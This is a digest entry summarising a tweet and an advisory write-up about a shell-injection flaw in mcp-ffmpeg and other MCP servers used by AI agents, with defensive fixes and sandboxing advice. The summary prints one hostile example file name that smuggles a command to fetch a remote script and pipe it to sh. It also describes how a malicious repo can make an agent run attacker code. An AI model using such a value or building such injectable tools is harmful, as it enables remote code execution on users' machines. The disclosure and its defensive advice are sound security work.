---
uid: "X-361"
title: "mcp-ffmpeg and other MCP servers pass file names into a shell: no patch yet"
platform: "Twitter"
category: "Dev Tools & Productivity"
subcategory: "MCP security"
author: "Jon（ジョン）"
date: "2026-10-30"
url: "https://x.com/jcinjpn/status/2116194202967224345"
engagement: "12 replies · 8 reposts · 131 likes · 204 bookmarks · 14.6K views"
followup: "high"
media: "none"
important: "mcp-ffmpeg 1.0.5 and below allow shell injection through file names. VulnCheck listed no fixed version for nine MCP servers (checked 6 Nov 2026). Check your MCP config and sandbox the agent."
links: ["https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/"]
tags: ["mcp", "security", "command-injection", "ffmpeg", "sandbox", "twitter", "dev-tools-productivity"]
---

# mcp-ffmpeg and other MCP servers pass file names into a shell: no patch yet

**[Open original ↗](https://x.com/jcinjpn/status/2116194202967224345)** · `Jon（ジョン）` · 2026-10-30 · 12 replies · 8 reposts · 131 likes · 204 bookmarks · 14.6K views · ⭐ high follow-up

> ⏰ **Important:** mcp-ffmpeg 1.0.5 and below allow shell injection through file names. VulnCheck listed no fixed version for nine MCP servers (checked 6 Nov 2026). Check your MCP config and sandbox the agent.

## 💬 Essence

Jon warns that mcp-ffmpeg version 1.0.5 and below builds a shell command from the video path. A file named like clip$(curl pwnd.sh|sh).mp4, from a bad repo or readme, can run the attacker's script when the agent resizes the file. He says there is no patch and that other MCP servers are affected. The fix for tool authors: pass arguments as an array, never use shell=True, and treat every tool argument as user input. His thread links the write-up on theinjection.dev. That write-up was checked on 6 Nov 2026: VulnCheck published nine MCP-server advisories on 27 Oct 2026 (including Kali-GPT, mcp-ffmpeg, esp-mcp and the sf-mcp and ai-sdlc tools), eight are OS command injection rated CVSS 7.3 to 8.5, and none names a fixed version. Replies say to sandbox, and that a plain ffmpeg CLI in a sandbox avoids the problem. A reply from Cloudflare points to its open-source security-audit skill.

## 💡 Takeaway

If you gave an agent mcp-ffmpeg or a similar CLI-wrapping MCP server, check your config and sandbox it. No fixed version was listed on 6 Nov.

## 🔗 Try it

- [https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/](https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/)

**Filed in:** [[Dev Tools & Productivity]] · [[Home]]

🏷 mcp, security, command-injection, ffmpeg, sandbox, twitter, dev-tools-productivity
